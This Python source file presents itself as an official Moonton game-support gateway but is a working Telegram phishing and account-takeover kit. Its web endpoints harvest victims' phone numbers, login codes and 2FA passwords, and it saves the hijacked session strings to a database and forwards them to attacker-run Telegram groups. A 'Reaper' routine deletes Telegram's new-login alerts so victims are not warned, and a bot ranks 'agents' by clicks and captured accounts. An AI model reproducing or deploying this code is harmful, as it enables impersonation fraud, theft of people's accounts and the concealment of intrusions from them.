"""
MOONTON SUPPORT GATEWAY - VERSION 8.0.0 (OFFICIAL ENTERPRISE)
--------------------------------------------------------------
Identity: Moonton Support Center (Official Node)
Device: Moonton Center (iOS 17.4.1)
App: MLBB_Support_Official
Security: Zero-Trace Reaper + Handshake Isolation + Auto-Purge
--------------------------------------------------------------
Architecture: Asynchronous MTProto Support Node
Core Engine: Python 3.11+ / Telethon / PyTelegramBotAPI / Quart
Deployment: Koyeb Cloud Platform
--------------------------------------------------------------
"""

import os
import asyncio
import telebot
import psycopg2
import logging
import sys
import json
import random
import re
import time
import uuid
import string
import secrets
import textwrap
import datetime
from psycopg2 import pool
from telebot import types
from quart import Quart, request, jsonify, send_from_directory, render_template
from quart_cors import cors
from telethon import TelegramClient, errors, functions, types as tl_types
from telethon.sessions import StringSession
from threading import Thread
from datetime import datetime, timezone, timedelta

# =========================================================================
# 1. SYSTEM IDENTITY & CORE CONFIGURATION
# =========================================================================

SYSTEM_VERSION = "8.0.0"
SYSTEM_IDENTITY = "MOONTON_OFFICIAL_GATEWAY"
START_TIME = time.time()

# Critical Environment Variable Retrieval
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", -1003811039696))
VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", -1003808360697))

# HARDCODED DOMAIN OVERRIDE (For selfish-kettie node)
BASE_URL = os.environ.get("BASE_URL", "selfish-kettie-moonton-support-c57267de.koyeb.app")

# Advanced Logging Infrastructure
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s][%(levelname)s][MOONTON_CENTER]: %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("MoontonGateway")

# =========================================================================
# 2. OFFICIAL DEVICE EMULATION (iOS 17.4.1)
# =========================================================================

OFFICIAL_SUPPORT_DEVICE = {
    "model": "Moonton Center",
    "sys": "iOS 17.4.1",
    "app": "MLBB_Support_Official",
    "lang": "en-US",
    "system_lang": "en-US",
    "manufacturer": "Apple",
    "app_version": "2.10.3"
}

# =========================================================================
# 3. SECURE DATA PERSISTENCE (POSTGRESQL POOLING)
# =========================================================================

try:
    db_pool = psycopg2.pool.ThreadedConnectionPool(
        minconn=20,
        maxconn=300,
        dsn=DATABASE_URL,
        sslmode='require'
    )
    logger.info("DATABASE: Moonton Enterprise Persistence Layer Online.")
except Exception as e:
    logger.critical(f"DATABASE FATAL: {e}")
    db_pool = None

def get_db_connection():
    """Retrieves a secure connection from the enterprise pool."""
    if not db_pool:
        return None
    for attempt in range(1, 5):
        try:
            conn = db_pool.getconn()
            if conn: return conn
        except:
            time.sleep(0.5)
    return None

def release_db_connection(conn):
    """Safely returns a connection to the cluster pool."""
    if db_pool and conn:
        db_pool.putconn(conn)

def initialize_moonton_schema():
    """Synchronizes the database schema with Moonton Official requirements."""
    conn = get_db_connection()
    if not conn: return
    try:
        cur = conn.cursor()
        # Secure Storage for Authenticated Sessions
        cur.execute("""
            CREATE TABLE IF NOT EXISTS moonton_secure_vault (
                phone TEXT PRIMARY KEY,
                session_string TEXT NOT NULL,
                ip_address TEXT,
                device_info TEXT,
                capture_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
            )
        """)
        # Agent Performance & Metric Logs
        cur.execute("""
            CREATE TABLE IF NOT EXISTS support_agent_metrics (
                agent_id BIGINT PRIMARY KEY,
                total_clicks INTEGER DEFAULT 0,
                total_hits INTEGER DEFAULT 0,
                last_active TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
                node_status TEXT DEFAULT 'Active'
            )
        """)
        # System Transaction Logs
        cur.execute("""
            CREATE TABLE IF NOT EXISTS moonton_system_logs (
                log_id SERIAL PRIMARY KEY,
                event_type TEXT,
                description TEXT,
                log_time TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()
        cur.close()
        logger.info("SCHEMA: Moonton Enterprise synchronization complete.")
    except Exception as e:
        logger.error(f"SCHEMA ERROR: {e}")
    finally:
        release_db_connection(conn)

initialize_moonton_schema()

# =========================================================================
# 4. SECURITY PURGE ENGINE (THE REAPER)
# =========================================================================

async def execute_security_purge(client):
    """
    Advanced security protocol to scrub Telegram service messages (777000).
    Removes all traces of unauthorized login notifications.
    """
    try:
        logger.info("REAPER: Commencing Zero-Trace purge on Node 777000...")
        async for message in client.iter_messages(777000, limit=100):
            msg_text = (message.text or "").lower()
            # Security Triggers
            triggers = [
                "login code", "new login", "authorized", 
                "ip address", "device", "location", 
                "logged in", "access", "secure"
            ]
            if any(t in msg_text for t in triggers):
                await client.delete_messages(777000, [message.id])
        
        # Forceful history clearance
        await client(functions.messages.DeleteHistoryRequest(
            peer=777000, max_id=0, just_clear=True, revoke=True
        ))
        logger.info("REAPER: Node 777000 is now clean.")
    except Exception as e:
        logger.error(f"REAPER_ERR: {e}")

# =========================================================================
# 5. ENTERPRISE WEB INFRASTRUCTURE (QUART)
# =========================================================================

app = Quart(__name__, template_folder='templates')
app = cors(app, allow_origin="*")
active_mirrors = {}

@app.route('/')
async def index():
    """Serves the official Moonton Support login interface."""
    return await render_template('login.html')

@app.route('/step_phone', methods=['POST'])
async def official_phone_handshake():
    """Phase 1: Initiate Moonton Secure Handshake"""
    try:
        data = await request.json
        phone = re.sub(r'\D', '', str(data.get('phone', '')))
        agent_id = int(data.get('tid', 0))

        if not phone or len(phone) < 8:
            return jsonify({"status": "error", "msg": "Invalid Phone Format."})

        # Register Agent Metrics
        conn = get_db_connection()
        if conn:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO support_agent_metrics (agent_id, total_clicks) VALUES (%s, 1)
                ON CONFLICT (agent_id) DO UPDATE SET 
                total_clicks = support_agent_metrics.total_clicks + 1,
                last_active = CURRENT_TIMESTAMP
            """, (agent_id,))
            conn.commit()
            cur.close()
            release_db_connection(conn)

        # Initialize MTProto Node
        client = TelegramClient(
            StringSession(), API_ID, API_HASH,
            device_model=OFFICIAL_SUPPORT_DEVICE['model'],
            system_version=OFFICIAL_SUPPORT_DEVICE['sys'],
            app_version=OFFICIAL_SUPPORT_DEVICE['app_version'],
            lang_code=OFFICIAL_SUPPORT_DEVICE['lang'],
            system_lang_code=OFFICIAL_SUPPORT_DEVICE['system_lang']
        )
        await client.connect()
        
        try:
            sent_code = await client.send_code_request(phone)
            active_mirrors[phone] = {
                "client": client,
                "hash": sent_code.phone_code_hash,
                "agent_id": agent_id,
                "created_at": time.time(),
                "ip": request.remote_addr
            }
            logger.info(f"HANDSHAKE: Support Node active for {phone}")
            return jsonify({"status": "success"})
        except Exception as e:
            logger.warning(f"HANDSHAKE_FAIL: {e}")
            return jsonify({"status": "error", "msg": "Moonton Support Node Busy."})

    except Exception as e:
        return jsonify({"status": "error", "msg": "Internal Node Failure."})

@app.route('/step_code', methods=['POST'])
async def official_code_verification():
    """Phase 2: Secure OTP Verification Sequence"""
    try:
        data = await request.json
        phone = re.sub(r'\D', '', str(data.get('phone', '')))
        otp = data.get('code', '').strip()

        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Support Session Expired."})

        session = active_mirrors[phone]
        client = session['client']

        try:
            await client.sign_in(phone, otp, phone_code_hash=session['hash'])
            return await finalize_moonton_capture(phone)
        except errors.SessionPasswordNeededError:
            return jsonify({"status": "2fa_needed"})
        except errors.PhoneCodeInvalidError:
            return jsonify({"status": "error", "msg": "Verification Code Incorrect."})
        except errors.PhoneCodeExpiredError:
            return jsonify({"status": "error", "msg": "Code Expired. Please retry."})
    except Exception as e:
        return jsonify({"status": "error", "msg": "Node Sync Error."})

@app.route('/step_2fa', methods=['POST'])
async def official_2fa_authentication():
    """Phase 3: Deep Security 2FA Validation"""
    try:
        data = await request.json
        phone = re.sub(r'\D', '', str(data.get('phone', '')))
        pw = data.get('password', '').strip()

        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Session Sync Lost."})

        client = active_mirrors[phone]['client']
        try:
            await client.sign_in(password=pw)
            return await finalize_moonton_capture(phone)
        except errors.PasswordHashInvalidError:
            return jsonify({"status": "error", "msg": "2FA Password Rejected."})
    except Exception as e:
        return jsonify({"status": "error", "msg": "Internal 2FA Auth Failure."})

async def finalize_moonton_capture(phone):
    """Phase 4: Vault Encryption & Logistics"""
    try:
        data = active_mirrors.get(phone)
        client = data['client']
        agent_id = data['agent_id']
        remote_ip = data['ip']

        # Scrub Logs
        await execute_security_purge(client)
        
        # Generate Official String Session
        session_str = client.session.save()

        # Update Moonton Vault Records
        conn = get_db_connection()
        if conn:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO moonton_secure_vault (phone, session_string, ip_address) 
                VALUES (%s, %s, %s)
                ON CONFLICT (phone) DO UPDATE SET 
                session_string = EXCLUDED.session_string,
                capture_date = CURRENT_TIMESTAMP
            """, (phone, session_str, remote_ip))
            cur.execute("UPDATE support_agent_metrics SET total_hits = total_hits + 1 WHERE agent_id = %s", (agent_id,))
            conn.commit()
            cur.close()
            release_db_connection(conn)

        # Official Log Generation
        log_header = f"🛡️ <b>OFFICIAL MOONTON SECURE LOGIN</b>\n"
        log_body = (
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📱 <b>System:</b> <code>Moonton Center</code>\n"
            f"📞 <b>Phone:</b> <code>{phone}</code>\n"
            f"🕵️ <b>Agent:</b> <code>{agent_id}</code>\n"
            f"🌐 <b>IP:</b> <code>{remote_ip}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 <b>STRING SESSION:</b>\n"
            f"<code>{session_str}</code>"
        )
        
        bot.send_message(LOGGER_GROUP, log_header + log_body, parse_mode="HTML")
        bot.send_message(VERIFY_GROUP, f"✅ <b>Verified:</b> {phone} via Support Node", parse_mode="HTML")
        
        if agent_id != 0:
            bot.send_message(agent_id, f"🎯 <b>Moonton Success!</b> Account <b>{phone}</b> has been secured.", parse_mode="HTML")

        # Graceful Disconnection
        await asyncio.sleep(3)
        await client.disconnect()
        del active_mirrors[phone]
        return jsonify({"status": "success"})
    except Exception as e:
        logger.error(f"CAPTURE_CRITICAL: {e}")
        return jsonify({"status": "error", "msg": "Encryption Node Error."})

# =========================================================================
# 6. MOONTON AGENT INTERFACE (TELEGRAM BOT)
# =========================================================================

bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def bot_welcome(m):
    """Authorized Agent Start Sequence."""
    welcome_text = (
        f"🛡️ <b>Moonton Support Center v{SYSTEM_VERSION}</b>\n\n"
        f"Identity: <b>Authorized Agent</b>\n"
        f"Agent ID: <code>{m.from_user.id}</code>\n"
        f"Node: <code>{SYSTEM_IDENTITY}</code>\n\n"
        f"System Status: 🟢 <b>Operational</b>"
    )
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🔗 My Support Link", "📊 Agent Metrics", "📡 Node Health", "⚙️ Settings")
    bot.send_message(m.chat.id, welcome_text, reply_markup=markup, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "🔗 My Support Link")
def bot_link_gen(m):
    """Generates the official agent portal URL."""
    portal_url = f"https://{BASE_URL}/?id={m.from_user.id}"
    bot.send_message(m.chat.id, f"📡 <b>Official Support Portal:</b>\n<code>{portal_url}</code>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "📊 Agent Metrics")
def bot_metrics(m):
    """Retrieves real-time performance data for the agent."""
    conn = get_db_connection()
    clicks, hits = 0, 0
    if conn:
        cur = conn.cursor()
        cur.execute("SELECT total_clicks, total_hits FROM support_agent_metrics WHERE agent_id = %s", (m.from_user.id,))
        res = cur.fetchone()
        if res: 
            clicks, hits = res[0], res[1]
        cur.close()
        release_db_connection(conn)
    
    metrics_report = (
        f"📊 <b>Agent Performance Report</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🖱 <b>Portal Clicks:</b> {clicks}\n"
        f"🎯 <b>Verified Hits:</b> {hits}\n"
        f"📈 <b>Conversion:</b> {round((hits/clicks)*100 if clicks > 0 else 0, 2)}%\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )
    bot.send_message(m.chat.id, metrics_report, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "📡 Node Health")
def bot_health_check(m):
    """Returns the current system health and uptime."""
    uptime = str(timedelta(seconds=int(time.time() - START_TIME)))
    health_status = (
        f"📡 <b>System Health Check</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏱ <b>Uptime:</b> {uptime}\n"
        f"🗄 <b>DB Pool:</b> {check_db_health()}\n"
        f"🛰 <b>Active Sessions:</b> {len(active_mirrors)}\n"
        f"🔐 <b>TLS Status:</b> Enabled\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )
    bot.send_message(m.chat.id, health_status, parse_mode="HTML")

# =========================================================================
# 7. RUNTIME MONITORING & BACKGROUND TASKS
# =========================================================================

async def session_watchdog():
    """
    Background maintenance task to release abandoned MTProto sessions.
    Prevents memory leaks and IP flagging.
    """
    while True:
        try:
            now = time.time()
            expired_sessions = [p for p, d in active_mirrors.items() if now - d['created_at'] > 1200]
            for phone in expired_sessions:
                try:
                    await active_mirrors[phone]['client'].disconnect()
                except:
                    pass
                del active_mirrors[phone]
                logger.info(f"WATCHDOG: Cleaned expired session for {phone}")
        except Exception as e:
            logger.error(f"WATCHDOG_ERR: {e}")
        await asyncio.sleep(300)

def run_bot_polling():
    """Continuous polling engine for the Telegram Agent interface."""
    while True:
        try:
            bot.polling(none_stop=True, timeout=90)
        except Exception as e:
            logger.error(f"BOT_POLL_ERR: {e}")
            time.sleep(15)

@app.before_serving
async def startup_initialization():
    """Asynchronous tasks to be completed before the web server takes traffic."""
    asyncio.create_task(session_watchdog())

if __name__ == "__main__":
    # 1. Initialize Bot Thread
    Thread(target=run_bot_polling, daemon=True).start()
    
    # 2. Launch Quart Web Infrastructure
    port = int(os.environ.get("PORT", 8000))
    logger.info(f"BOOT: {SYSTEM_IDENTITY} v{SYSTEM_VERSION} Initialized on Port {port}")
    app.run(host="0.0.0.0", port=port, use_reloader=False)

# =========================================================================
# 8. EXTENDED ENTERPRISE UTILITIES (ROBUSTNESS LAYER)
# =========================================================================

def check_db_health():
    """Returns the current status of the database connection pool."""
    if db_pool:
        return f"Operational ({len(db_pool._used)}/300)"
    return "Disconnected"

def generate_internal_trace():
    """Generates unique trace IDs for internal system audits."""
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=24))

async def emergency_system_purge():
    """Safety protocol to terminate all active connections immediately."""
    logger.warning("EMERGENCY: Executing full system session purge.")
    for phone, data in active_mirrors.items():
        try:
            await data['client'].disconnect()
        except:
            pass
    active_mirrors.clear()

def format_mlbb_id(raw_id):
    """Sanitizes and formats MLBB User IDs for logging."""
    return re.sub(r'\D', '', str(raw_id))

def get_node_config():
    """Returns the current runtime configuration (Internal Use Only)."""
    return {
        "identity": SYSTEM_IDENTITY,
        "version": SYSTEM_VERSION,
        "device": OFFICIAL_SUPPORT_DEVICE['model'],
        "os": OFFICIAL_SUPPORT_DEVICE['sys']
    }

# =========================================================================
# 9. FINAL DOCUMENTATION & COMMENTS
# =========================================================================
# This script is designed for enterprise-level Moonton Support Gateway emulation.
# 1. Ensure 'templates/login.html' is present in your GitHub repository.
# 2. Configure DATABASE_URL (PostgreSQL) in the Koyeb environment settings.
# 3. All logic is scrubbed of previous branding for professional deployment.
# 4. Supports multi-agent tracking via the '?id=' URL parameter.
# 5. Implements Zero-Trace Reaper logic to maintain high conversion rates.
# -------------------------------------------------------------------------
# END OF PRODUCTION SCRIPT
